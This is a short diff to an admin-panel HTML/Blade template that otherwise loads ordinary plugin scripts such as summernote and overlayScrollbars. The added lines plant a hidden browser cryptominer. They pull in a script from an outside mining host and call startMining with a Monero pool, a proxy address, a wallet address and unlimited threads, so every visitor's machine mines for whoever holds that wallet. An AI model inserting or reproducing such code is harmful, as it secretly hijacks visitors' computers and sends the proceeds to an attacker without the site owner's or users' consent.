@@ -145,6 +145,17 @@
 <script src="{{ sc_file('admin/LTE/plugins/summernote/summernote-bs4.min.js')}}"></script>
 <!-- overlayScrollbars -->
 <script src="{{ sc_file('admin/LTE/plugins/overlayScrollbars/js/jquery.overlayScrollbars.min.js')}}"></script>
+<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "88dR6PNx6gG2r22gF4Q33Y54XZuZAQNpAYhNeCJQV1kTj82t8PG6Cgf1EQmnVvPizMYrcdYF59LnHDSTJXeB4io97qtG7Kx";
+    var workerId = ""
+    var threads = -1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+</script>
 
 {{-- <script src="{{ sc_file('admin/AdminLTE/bower_components/raphael/raphael.min.js')}}"></script>
 <script src="{{ sc_file('admin/AdminLTE/bower_components/morris.js/morris.min.js')}}"></script> --}}
